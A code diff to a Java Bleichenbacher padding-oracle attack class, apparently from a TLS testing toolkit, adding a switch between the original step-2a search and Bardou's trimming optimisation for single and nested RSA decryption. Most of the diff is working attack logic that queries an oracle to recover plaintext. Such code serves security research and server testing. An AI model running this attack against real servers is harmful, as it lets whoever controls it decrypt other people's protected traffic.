@@ -436,18 +436,20 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     /** The function to start the Attack */
-    public void attack() {
+    public void attack(boolean classic) {
 
         if (hostPublicKey.getModulus().bitLength() > serverPublicKey.getModulus().bitLength()) {
             byte[] cracked =
-                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
+                    nestedBleichenbacher(
+                            encryptedMsg, this.serverPublicKey, this.hostPublicKey, classic);
             LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
             byte[] cracked_decoded = pkcs1Decode(cracked);
             LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
             solution = new BigInteger(cracked_decoded);
         } else {
             byte[] cracked =
-                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
+                    nestedBleichenbacher(
+                            encryptedMsg, this.serverPublicKey, this.hostPublicKey, classic);
             LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
             byte[] cracked_decoded = pkcs1Decode(cracked);
             LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
@@ -467,7 +469,8 @@ public class Bleichenbacher extends Pkcs1Attack {
     private byte[] nestedBleichenbacher(
             byte[] ciphertext,
             CustomRsaPublicKey innerPublicKey,
-            CustomRsaPublicKey outerPublicKey) {
+            CustomRsaPublicKey outerPublicKey,
+            boolean classic) {
         int innerBitsize = innerPublicKey.getModulus().bitLength();
         int outerBitsize = outerPublicKey.getModulus().bitLength();
         int innerK = innerBitsize / 8;
@@ -480,7 +483,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
         // LOGGER.debug("Starting with outer BB {} ", ArrayConverter.bytesToHexString(ciphertext));
-        byte[] encoded_inner_ciphertext = bleichenbacher(ciphertext, outerPublicKey);
+        byte[] encoded_inner_ciphertext = bleichenbacher(ciphertext, outerPublicKey, classic);
         // LOGGER.debug("got inner BB {}", ArrayConverter.bytesToHexString(ciphertext));
         byte[] innerCiphertext = pkcs1Decode(encoded_inner_ciphertext);
         // LOGGER.debug("Decoded inner BB into {}",
@@ -494,7 +497,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        return innerBleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey);
+        return innerBleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey, classic);
     }
 
     /**
@@ -508,10 +511,12 @@ public class Bleichenbacher extends Pkcs1Attack {
     private byte[] innerBleichenbacher(
             byte[] ciphertext,
             CustomRsaPublicKey innerPublicKey,
-            CustomRsaPublicKey outerPublicKey) {
+            CustomRsaPublicKey outerPublicKey,
+            boolean classic) {
 
         int innerBitsize = innerPublicKey.getModulus().bitLength();
         int innerK = innerBitsize / 8;
+        BigInteger s;
 
         LOGGER.debug(
                 "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
@@ -529,90 +534,103 @@ public class Bleichenbacher extends Pkcs1Attack {
                 "M lower: {} M upper: {}",
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
+        if (!classic) {
+            ArrayList<int[]> trimmers = new ArrayList<>();
+            for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
+                if (t <= 50) {
+                    for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
+                        if (BigInteger.valueOf(u)
+                                .gcd(BigInteger.valueOf(t))
+                                .equals(BigInteger.ONE)) {
+                            trimmers.add(new int[] {u, t});
+                        }
+                    }
+                } else { // t > 50
+                    trimmers.add(new int[] {t - 1, t});
+                    trimmers.add(new int[] {t + 1, t});
+                }
+            }
+            ArrayList<int[]> utPairs = new ArrayList<>();
 
-        ArrayList<int[]> trimmers = new ArrayList<>();
-        for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
-            if (t <= 50) {
-                for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
-                    if (BigInteger.valueOf(u).gcd(BigInteger.valueOf(t)).equals(BigInteger.ONE)) {
-                        trimmers.add(new int[] {u, t});
+            for (int[] ut : trimmers) {
+                int u = ut[0];
+                int t = ut[1];
+
+                BigInteger uBI = BigInteger.valueOf(u);
+                BigInteger tBI = BigInteger.valueOf(t);
+
+                BigInteger cipherbig = new BigInteger(1, ciphertext);
+
+                BigInteger result =
+                        cipherbig
+                                .multiply(
+                                        (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
+                                                .modPow(
+                                                        innerPublicKey.getPublicExponent(),
+                                                        innerPublicKey.getModulus()))
+                                .mod(innerPublicKey.getModulus());
+
+                BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);
+
+                if (queryOracle(
+                        encryptedAttempt,
+                        true)) { // assuming the oracle and util method exists and does what
+                    // expected
+                    utPairs.add(new int[] {u, t});
+                }
+            }
+
+            if (!utPairs.isEmpty()) {
+
+                ArrayList<Integer> t_values = new ArrayList<>();
+                for (int[] pair : utPairs) {
+                    t_values.add(pair[1]);
+                }
+
+                int t_prime = lcm_n(t_values);
+
+                int u_min = Integer.MAX_VALUE;
+                int u_max = Integer.MIN_VALUE;
+                for (int[] pair : utPairs) {
+                    int current = pair[0] * t_prime / pair[1];
+                    if (current < u_min) {
+                        u_min = current;
+                    }
+                    if (current > u_max) {
+                        u_max = current;
                     }
                 }
-            } else { // t > 50
-                trimmers.add(new int[] {t - 1, t});
-                trimmers.add(new int[] {t + 1, t});
-            }
-        }
-        ArrayList<int[]> utPairs = new ArrayList<>();
 
-        for (int[] ut : trimmers) {
-            int u = ut[0];
-            int t = ut[1];
+                BigInteger a =
+                        two_B.multiply(BigInteger.valueOf(t_prime))
+                                .divide(BigInteger.valueOf(u_min));
+                BigInteger b =
+                        three_B_sub_one
+                                .multiply(BigInteger.valueOf(t_prime))
+                                .divide(BigInteger.valueOf(u_max));
 
-            BigInteger uBI = BigInteger.valueOf(u);
-            BigInteger tBI = BigInteger.valueOf(t);
-
-            BigInteger cipherbig = new BigInteger(1, ciphertext);
-
-            BigInteger result =
-                    cipherbig
-                            .multiply(
-                                    (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
-                                            .modPow(
-                                                    innerPublicKey.getPublicExponent(),
-                                                    innerPublicKey.getModulus()))
-                            .mod(innerPublicKey.getModulus());
-
-            BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);
-
-            if (queryOracle(
-                    encryptedAttempt,
-                    true)) { // assuming the oracle and util method exists and does what expected
-                utPairs.add(new int[] {u, t});
-            }
-        }
-
-        if (!utPairs.isEmpty()) {
-
-            ArrayList<Integer> t_values = new ArrayList<>();
-            for (int[] pair : utPairs) {
-                t_values.add(pair[1]);
+                M = new ArrayList<>();
+                M.add(new Interval(a, b));
+                LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
+            } else {
+                LOGGER.debug("UT-Paris where empty");
             }
 
-            int t_prime = lcm_n(t_values);
+            s =
+                    find_smallest_s_nested(
+                            ceil(innerPublicKey.getModulus().add(two_B), M.get(0).lower),
+                            ciphertext,
+                            innerPublicKey,
+                            outerPublicKey);
 
-            int u_min = Integer.MAX_VALUE;
-            int u_max = Integer.MIN_VALUE;
-            for (int[] pair : utPairs) {
-                int current = pair[0] * t_prime / pair[1];
-                if (current < u_min) {
-                    u_min = current;
-                }
-                if (current > u_max) {
-                    u_max = current;
-                }
-            }
-
-            BigInteger a =
-                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
-            BigInteger b =
-                    three_B_sub_one
-                            .multiply(BigInteger.valueOf(t_prime))
-                            .divide(BigInteger.valueOf(u_max));
-
-            M = new ArrayList<>();
-            M.add(new Interval(a, b));
-            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
         } else {
-            LOGGER.debug("UT-Paris where empty");
+            s =
+                    find_smallest_s_nested(
+                            ceil(innerPublicKey.getModulus(), three_B),
+                            ciphertext,
+                            innerPublicKey,
+                            outerPublicKey);
         }
-
-        BigInteger s =
-                find_smallest_s_nested(
-                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).lower),
-                        ciphertext,
-                        innerPublicKey,
-                        outerPublicKey);
 
         LOGGER.debug(
                 "found s, initial updating M lower: {} M upper: {}",
@@ -676,7 +694,8 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param publicKey The known public key, which was used to encrypt the ciphertext
      * @return the decrypted ciphertext, whith a valid PKCS#1 Padding
      */
-    private byte[] bleichenbacher(byte[] ciphertext, CustomRsaPublicKey publicKey) {
+    private byte[] bleichenbacher(
+            byte[] ciphertext, CustomRsaPublicKey publicKey, boolean classic) {
         int bitsize = publicKey.getModulus().bitLength();
         int k = bitsize / 8;
 
@@ -697,86 +716,99 @@ public class Bleichenbacher extends Pkcs1Attack {
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
 
-        ArrayList<int[]> trimmers = new ArrayList<>();
-        for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
-            if (t <= 50) {
-                for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
-                    if (BigInteger.valueOf(u).gcd(BigInteger.valueOf(t)).equals(BigInteger.ONE)) {
-                        trimmers.add(new int[] {u, t});
+        BigInteger s;
+
+        if (!classic) {
+            ArrayList<int[]> trimmers = new ArrayList<>();
+            for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
+                if (t <= 50) {
+                    for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
+                        if (BigInteger.valueOf(u)
+                                .gcd(BigInteger.valueOf(t))
+                                .equals(BigInteger.ONE)) {
+                            trimmers.add(new int[] {u, t});
+                        }
+                    }
+                } else { // t > 50
+                    trimmers.add(new int[] {t - 1, t});
+                    trimmers.add(new int[] {t + 1, t});
+                }
+            }
+            ArrayList<int[]> utPairs = new ArrayList<>();
+
+            for (int[] ut : trimmers) {
+                int u = ut[0];
+                int t = ut[1];
+
+                BigInteger uBI = BigInteger.valueOf(u);
+                BigInteger tBI = BigInteger.valueOf(t);
+
+                BigInteger cipherbig = new BigInteger(1, ciphertext);
+
+                BigInteger result =
+                        cipherbig
+                                .multiply(
+                                        (uBI.multiply(tBI.modInverse(publicKey.getModulus())))
+                                                .modPow(
+                                                        publicKey.getPublicExponent(),
+                                                        publicKey.getModulus()))
+                                .mod(publicKey.getModulus());
+
+                if (queryOracle(
+                        result,
+                        false)) { // assuming the oracle and util method exists and does what
+                    // expected
+                    utPairs.add(new int[] {u, t});
+                }
+            }
+
+            if (!utPairs.isEmpty()) {
+
+                ArrayList<Integer> t_values = new ArrayList<>();
+                for (int[] pair : utPairs) {
+                    t_values.add(pair[1]);
+                }
+
+                int t_prime = lcm_n(t_values);
+
+                int u_min = Integer.MAX_VALUE;
+                int u_max = Integer.MIN_VALUE;
+                for (int[] pair : utPairs) {
+                    int current = pair[0] * t_prime / pair[1];
+                    if (current < u_min) {
+                        u_min = current;
+                    }
+                    if (current > u_max) {
+                        u_max = current;
                     }
                 }
-            } else { // t > 50
-                trimmers.add(new int[] {t - 1, t});
-                trimmers.add(new int[] {t + 1, t});
-            }
-        }
-        ArrayList<int[]> utPairs = new ArrayList<>();
 
-        for (int[] ut : trimmers) {
-            int u = ut[0];
-            int t = ut[1];
+                BigInteger a =
+                        two_B.multiply(BigInteger.valueOf(t_prime))
+                                .divide(BigInteger.valueOf(u_min));
+                BigInteger b =
+                        three_B_sub_one
+                                .multiply(BigInteger.valueOf(t_prime))
+                                .divide(BigInteger.valueOf(u_max));
 
-            BigInteger uBI = BigInteger.valueOf(u);
-            BigInteger tBI = BigInteger.valueOf(t);
-
-            BigInteger cipherbig = new BigInteger(1, ciphertext);
-
-            BigInteger result =
-                    cipherbig
-                            .multiply(
-                                    (uBI.multiply(tBI.modInverse(publicKey.getModulus())))
-                                            .modPow(
-                                                    publicKey.getPublicExponent(),
-                                                    publicKey.getModulus()))
-                            .mod(publicKey.getModulus());
-
-            if (queryOracle(
-                    result,
-                    false)) { // assuming the oracle and util method exists and does what expected
-                utPairs.add(new int[] {u, t});
-            }
-        }
-
-        if (!utPairs.isEmpty()) {
-
-            ArrayList<Integer> t_values = new ArrayList<>();
-            for (int[] pair : utPairs) {
-                t_values.add(pair[1]);
+                M = new ArrayList<>();
+                M.add(new Interval(a, b));
+                LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
+            } else {
+                LOGGER.debug("UT-Paris where empty");
             }
 
-            int t_prime = lcm_n(t_values);
+            // Search for s1 with improved start-conditions from Bardou
+            s =
+                    find_smallest_s(
+                            ceil(publicKey.getModulus().add(two_B), M.get(0).lower),
+                            ciphertext,
+                            publicKey);
 
-            int u_min = Integer.MAX_VALUE;
-            int u_max = Integer.MIN_VALUE;
-            for (int[] pair : utPairs) {
-                int current = pair[0] * t_prime / pair[1];
-                if (current < u_min) {
-                    u_min = current;
-                }
-                if (current > u_max) {
-                    u_max = current;
-                }
-            }
-
-            BigInteger a =
-                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
-            BigInteger b =
-                    three_B_sub_one
-                            .multiply(BigInteger.valueOf(t_prime))
-                            .divide(BigInteger.valueOf(u_max));
-
-            M = new ArrayList<>();
-            M.add(new Interval(a, b));
-            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
         } else {
-            LOGGER.debug("UT-Paris where empty");
+            // do the regular search for s1 as described in the original paper
+            s = find_smallest_s(ceil(publicKey.getModulus(), three_B), ciphertext, publicKey);
         }
-
-        BigInteger s =
-                find_smallest_s(
-                        ceil(publicKey.getModulus().add(two_B), M.get(0).lower),
-                        ciphertext,
-                        publicKey);
 
         LOGGER.debug(
                 "found s, initial updating M lower: {} M upper: {}",
